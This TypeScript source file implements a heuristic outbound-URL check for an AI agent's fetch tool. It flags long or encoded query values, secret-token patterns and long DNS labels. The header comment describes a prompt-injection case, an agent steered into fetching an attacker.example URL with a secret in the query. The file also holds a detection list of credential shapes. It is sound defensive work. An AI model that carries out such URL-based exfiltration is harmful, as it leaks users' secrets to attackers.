/**
 * fetch_url — outbound URL check.
 *
 * The request URL itself (query string, path) is a way to send data OUT: an agent
 * steered by injected instructions — from any source, not only fetched pages —
 * can be told to fetch `https://attacker.example/?k=<secret>`. The safety checker
 * only ever reviews what comes BACK, so this runs first, before any network call.
 *
 * Heuristic by design: it flags URLs that *look like* they carry data or secrets.
 * The caller decides what a flag means (ask the user / refuse / ignore, per
 * FETCH_URL_OUTBOUND_CHECK). Reasons name the signal, never echo the value.
 */

export interface OutboundAssessment {
  suspicious: boolean;
  reasons: string[];
}

const MAX_URL_LENGTH = 512;
const MAX_QUERY_LENGTH = 256;
/** A single value this long in base64/base64url/hex alphabet looks like encoded data. */
const ENCODED_VALUE_MIN = 64;

/** Well-known secret/token shapes. Names are what the user sees; values never are. */
const SECRET_PATTERNS: ReadonlyArray<[RegExp, string]> = [
  [/sk-ant-[A-Za-z0-9_-]{20,}/, 'Anthropic API key'],
  [/\bsk-(?:proj-)?[A-Za-z0-9_-]{20,}/, 'OpenAI-style API key'],
  [/\b(?:AKIA|ASIA)[0-9A-Z]{16}\b/, 'AWS access key id'],
  [/\bgh[pousr]_[A-Za-z0-9]{36,}\b/, 'GitHub token'],
  [/\bgithub_pat_[A-Za-z0-9_]{22,}/, 'GitHub fine-grained token'],
  [/\bglpat-[A-Za-z0-9_-]{20,}/, 'GitLab token'],
  [/\bxox[abprs]-[A-Za-z0-9-]{10,}/, 'Slack token'],
  [/\bnpm_[A-Za-z0-9]{36}\b/, 'npm token'],
  [/\bAIza[0-9A-Za-z_-]{35}\b/, 'Google API key'],
  [/-----BEGIN [A-Z ]*PRIVATE KEY-----/, 'private key block'],
  [/\bssh-(?:rsa|ed25519|dss) AAAA[0-9A-Za-z+/]{20,}/, 'SSH public/private key material'],
  [/\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/, 'JWT'],
];

/**
 * Percent-decode WITHOUT form decoding: `+` stays `+`. URLSearchParams turns `+`
 * into a space, which breaks base64 (`+` is one of its characters): a value sent
 * as `?d=ab+cd…` would no longer look encoded and pass unflagged.
 */
function safeDecode(s: string): string {
  try { return decodeURIComponent(s); } catch { return s; }
}

/** Query parameters as sent, split on `&` / `=`, percent-decoded, `+` kept. */
function rawQueryParams(search: string): Array<[string, string]> {
  return search.replace(/^\?/, '').split('&').filter(Boolean).map((pair) => {
    const eq = pair.indexOf('=');
    return eq < 0 ? [safeDecode(pair), ''] : [safeDecode(pair.slice(0, eq)), safeDecode(pair.slice(eq + 1))];
  });
}

function looksEncoded(value: string): boolean {
  if (value.length < ENCODED_VALUE_MIN) return false;
  return /^[A-Za-z0-9+/_-]+={0,2}$/.test(value) || /^[0-9a-fA-F]+$/.test(value);
}

export function assessOutboundUrl(url: string): OutboundAssessment {
  const reasons: string[] = [];
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    return { suspicious: false, reasons };
  }

  if (url.length > MAX_URL_LENGTH) {
    reasons.push(`very long URL (${url.length} chars)`);
  }
  const query = parsed.search.replace(/^\?/, '');
  if (query.length > MAX_QUERY_LENGTH) {
    reasons.push(`long query string (${query.length} chars)`);
  }

  for (const [name, value] of rawQueryParams(parsed.search)) {
    if (looksEncoded(value)) {
      reasons.push(`encoded-looking value (${value.length} chars) in query parameter "${name.slice(0, 40)}"`);
    }
  }
  for (const segment of parsed.pathname.split('/')) {
    const decoded = safeDecode(segment);
    if (looksEncoded(decoded)) {
      reasons.push(`encoded-looking path segment (${decoded.length} chars)`);
    }
  }

  // Secrets anywhere: host (subdomain exfil), path, query, in raw and decoded form.
  const haystack = `${url}\n${safeDecode(url)}`;
  for (const [pattern, label] of SECRET_PATTERNS) {
    if (pattern.test(haystack)) reasons.push(`contains what looks like a ${label}`);
  }

  // A very long subdomain label is a classic DNS-exfiltration carrier (the data
  // leaves at DNS resolution, before any HTTP request). Labels cap at 63 chars;
  // legitimate ones this long are rare.
  for (const label of parsed.hostname.split('.')) {
    if (label.length >= 40) {
      reasons.push(`unusually long host label (${label.length} chars)`);
      break;
    }
  }

  const unique = [...new Set(reasons)];
  return { suspicious: unique.length > 0, reasons: unique };
}
